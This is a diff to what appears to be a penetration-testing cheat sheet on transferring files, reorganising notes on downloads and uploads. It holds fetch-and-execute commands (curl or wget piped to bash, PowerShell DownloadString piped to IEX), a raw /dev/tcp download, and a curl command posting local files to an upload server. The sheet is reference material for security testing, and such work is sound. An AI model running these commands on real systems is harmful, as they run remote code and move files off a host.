@@ -32,11 +32,18 @@ python3 -m http.server [port]
 ```
 # Just browse to it using a browser
 
-# Curl
+# Using curl or wget
 curl -o [filename] [url]
-
-# wget
 wget http(s)://[url] -O [filename]
+
+# Fileless using curl or wget
+curl -o [filename] [URL] | bash
+wget -qO- [URL] | bash
+
+# Using Bash Script
+exec 3<>/dev/tcp/<IP>/<port>
+echo -e "Get /<filename> HTTP/1.1\n\n">&3
+cat <&3
 ```
 ### Download (Windows)
 ```
@@ -54,31 +61,26 @@ IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')
 # We can also pipe the input directly into IEX
 (New-Object Net.WebClient).DownloadString('<Target File URL>') | IEX
 ```
+### Web Upload
+- Server Setup
+```
+# Create a cert for the server
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+
+# start the server
+sudo python3 -m uploadserver 443 --server-certificate [cert path]
+
+# Upload
+curl -X POST <URL> -F 'files=@<path_to_file>' -F 'files=@<path_to_file>' --insecure
+# Note multiple files in the same command. --insecure flag needed for self-signed cert
+```
+
 ## Base64 Encode/Decode
 ```
 #Base64 Encode
 cat <file> |base64 -w 0;echo
 #Base64 Decode
 echo -n '<encoded data>' | base64 -d > <filename>
-```
-## Web Downloads
-wget
-```bash
-wget https://<URL> -O <filename>
-```
-curl
-```bash
-curl -o <filename> <URL>
-```
-## Fileless Attacks
-Can pipe directly to most interpreters, like ```bash``` or ```python```
-Curl
-```bash
-curl -o <filename> <URL> | bash
-```
-wget
-```bash
-wget -qO- <URL> | bash
 ```
 ## Download with Bash (/dev/tcp)
 Connect to the target
